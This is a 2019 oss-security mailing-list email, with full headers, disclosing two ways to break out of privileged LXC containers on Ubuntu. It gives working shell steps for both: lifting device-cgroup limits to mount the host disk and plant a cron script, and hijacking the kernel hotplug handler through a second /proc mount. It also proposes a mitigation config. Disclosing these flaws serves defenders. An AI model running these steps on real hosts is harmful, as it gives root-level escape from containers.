X-VM-v5-Data: ([nil nil nil nil nil nil t nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5491" "Tuesday" "12" "February" "2019" "23:34:43" "+0500" "Alexander E. Patrakov" "patrakov@gmail.com" "<CAN_LGv21xFRzej=akWo0rn2PRMydbu-+33h6uqLJ6BkzP-kf3Q@mail.gmail.com>" "131" "[oss-security] Two more LXC breakouts (both privileged), apparmor issue?" "^Cc:" nil nil "2" "2019021218:34:43" "[oss-security] Two more LXC breakouts (both privileged), apparmor issue?" (number mark "  z     patrakov@gma Feb 12  131/5491  " thread-indent "\"[oss-security] Two more LXC breakouts (both privileged), apparmor issue?\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 1001
X-Mozilla-Status2: 00000000
Received: (qmail 12200 invoked by uid 550); 12 Feb 2019 18:35:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 12165 invoked from network); 12 Feb 2019 18:35:06 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=sTNR/ub0yMtzhDcCNRS/UJYdHBwNNBk36DYdZOtRO9g=;
        b=GUgvJgXA0JbT/Lm0dQzbgiFn/uK9pNCsKUbz6TiAQ0OROB4vntZ791b1oo49ecWzA9
         JxUJfI7Ln33YPN6fHhbb8/UDMcSkCH5DsYrM7yuXARewPFJeYVgwiOovB0MFxJZMyMsQ
         PyZvNpsPAU34L4dIw24xcdcSzFZQbCR13l3Snopmf+Nf9u0OYRAD4cH152gbdAJ776Ye
         +a5ENsuYFuH6o6QTJp7KZbDsfC/8WxY8DLBuX15TRDveKSGgqbTa7074yejryGeSE6mB
         g/aun6OCWgKMEZZ7aej+PSvXeC+6kyTZYkSGLIFplTu8A9RK6CuiGeKl9MMYdnPScZoM
         aZwg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=sTNR/ub0yMtzhDcCNRS/UJYdHBwNNBk36DYdZOtRO9g=;
        b=mVEby3EcOfNAOEV8d0xzbaVrkR4dABMm5UCTdLjHORf7ClCZz1oeDyJgLuvSOR9+/c
         4mHchVjAcRfPxY1X1KFcZRhxYjiOCBBJG6mCdomhefGWkPYL+HjA47sYNuFpS/hJ3VoA
         Ja2IdMfucN/Qhvwtn387Qh4BZ3NQZ9NEhZ7Vkx6RsuIWsRzmktUifzl1RP6Qq6x9JVJS
         HlHnHiHODK9koiCdqvAVwE0r5gQXCnXh8Yk9O93P+R/6MPe8MzF8cwp65S1Qs1mcTKRq
         cDP2HybDRlH+SMYA3Zf4k2vGMZ8kBUfg0Gh/K8unHFlCUpFYseiCYrcRkuHusybQdj+n
         IJ7Q==
X-Gm-Message-State: AHQUAuZjJwVcBw/AaPxWSj7SvXrnWQ9rbJWQSU6lBj/lC79MEgdliMpO
	TxFh5qPR5g5QOTJRKDqAE6tYHjULEL7ThLmiClVFXm7F
X-Google-Smtp-Source: AHgI3IZ8neVFlg7dOqYeh6KAfeXWLAIy8fMKAAOZ9CluqnjsJOlUnVcWU6JqpaERozTEDGXgVQUv6rQq2w7TMoeCtUQ=
X-Received: by 2002:ac8:166b:: with SMTP id x40mr3923310qtk.363.1549996494718;
 Tue, 12 Feb 2019 10:34:54 -0800 (PST)
MIME-Version: 1.0
Message-ID: <CAN_LGv21xFRzej=akWo0rn2PRMydbu-+33h6uqLJ6BkzP-kf3Q@mail.gmail.com>
Content-Type: text/plain; charset="UTF-8"
Cc: lxc-users@lists.linuxcontainers.org
Date: Tue, 12 Feb 2019 23:34:43 +0500
From: "Alexander E. Patrakov" <patrakov@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Two more LXC breakouts (both privileged), apparmor issue?
To: oss-security@lists.openwall.com

Hello,

there is a container breakout currently discussed (CVE-2019-5736),
which affected LXC among others. Let me share two more, IMHO easier,
breakout techniques that work against LXC, at least in Ubuntu 18.10,
which has LXC 3.0.3. Both techniques work only in privileged
containers, and so, given that LXC upstream does not treat privileged
containers as a viable security boundary, I don't think there is
anything CVE-worthy here, just an opportunity to tighten the defaults,
unless this is a bug in AppArmor or its policies. Also, please treat
this whole email as Ubuntu-specific, because of the references to
AppArmor.

The primary goal of this email is to post exploits, so that I can
point people to something better than just nonconstructive words about
"security implications" when they ask :)

The secondary goal is to learn a bit more about AppArmor, i.e. I was
surprised that the "mount" step works in the first exploit, want to
know why. I.e. what's the real difference between
"lxc-container-default" and "lxc-container-default-with-mounting"
profiles.

When reproducing exploits, it is important that you install openssh in
the test containers, and work from an ssh connection, not lxc-attach.
That's because of slightly-different namespace setups, and because
lxc-attach requires root, so "you already have to be root to break
out", i.e. the achievement becomes too trivial.

Prior art:

- myself trying to debug why the memory limit does not apply:
https://github.com/lxc/lxc/issues/2845
- an existing bug about unintended access to block devices:
https://github.com/lxc/lxc/issues/2762

Exploit 1: abuse of device cgroups and block devices

Prerequisite: a privileged container created with the "download"
template, without tweaking any AppArmor settings. E.g.:

sudo lxc-create -t download -n exploit1 -- -d ubuntu -r cosmic -a amd64

Install openssh there, then let a hacker ssh into it and let them sudo
to root. So now the hacker has root in a privileged container.

By default, the container is covered by the
"lxc-container-default-cgns" profile. Or at least, that's what
mentioned in dmesg in denial messages. It specifically allows mounting
of cgroup and cgroup2 filesystems under /sys/fs/cgroup. And, by
default, LXC relies on systemd inside the container to mount cgroup
hierarchies that it needs. There are also other profiles that can be
used but are not the default:

- lxc-container-default: does not allow mounting cgroup and cgroup2
- lxc-container-default-with-mounting: does not allow mounting cgroup
and cgroup2, but supposedly allows ext2/3/4, xfs, and btrfs.
- lxc-container-default-with-nesting: allows cgroup and cgroup2, also
allows almost arbitrary bind mounts.

So, to break out, let's exploit the fact that, on Ubuntu, cgroups are
the only protection against mounting arbitrary block devices in
containers - but, by default, there is nothing that prevents the
hacker from lifting the restriction from within a container. So:

# Step 1: find all device cgroups, add permission to use all block devices.
f=`find /sys/fs/cgroup -name devices.allow`
for d in $f ; do echo -n 'b *:* rwm' > "$d" ; done # you may need to
repeat this a few times
for d in $f ; do echo -n 'b *:* rwm' > "$d" ; done # ok, repeating

# Step 2: find an interesting block device, create a device node and mount it.
cat /proc/partitions # found /dev/vda1, looks like the host's root fs is there
mknod /dev/vda1 b 252 1 # based on numbers from /proc/partitions
mount /dev/vda1 /mnt # I don't know why this succeeds (on ext4), but it does

# Step 3: write some code that will run on the host
nano /mnt/etc/cron.d/badscript

# Step 4: wait for cron to run it on the host

I was able to mitigate this by not letting the container access any
cgroups except the bare minimum necessary for systemd to function. Not
sure if this creates other security problems.

lxc.apparmor.profile = lxc-container-default
lxc.mount.entry = tmpfs sys/fs/cgroup tmpfs nosuid,nodev,noexec,mode=755
lxc.mount.entry = cgroup sys/fs/cgroup/systemd cgroup
nosuid,nodev,noexec,xattr,name=systemd,create=dir

Question: why is this not the default?

Exploit 2: abuse of hotplug handler

Prerequisite: setup for nested privileged containers. E.g. this:

sudo lxc-create -t download -n exploit2 -- -d ubuntu -r cosmic -a amd64

... with this line uncommented in the config:

lxc.include = /usr/share/lxc/config/nesting.conf

(the config does warn about "security implications", but this is not
enough to convince people, "known root hole" would be a better
wording).

To break out, let's exploit the fact that the kernel, when told so via
/proc, will run arbitary programs for us. I mean, in reaction to
hotplug events - the legacy handler is settable via
/proc/sys/kernel/hotplug. There are some rules in the apparmor profile
that prohibit writing there, but apparmor is path-based, and these
rules would not fire if a copy of /proc is mounted somewhere else
(which is needed for nesting but is disallowed otherwise). So:

# Step 1: write a script that will run on the host.
nano /badscript
chmod +x /badscript

# Step 2: make it a hotplug event handler via a second instance of /proc
mkdir /proc2
mount --bind /proc /proc2
echo /var/lib/lxc/exploit2/rootfs/badscript > /proc2/sys/kernel/hotplug
# Well, there was some guessing here based on the default container
path, I hope it's OK

# Step 3: provoke some hotplug event. Actually, several events.
ip link add dummy0 type dummy


-- 
Alexander E. Patrakov
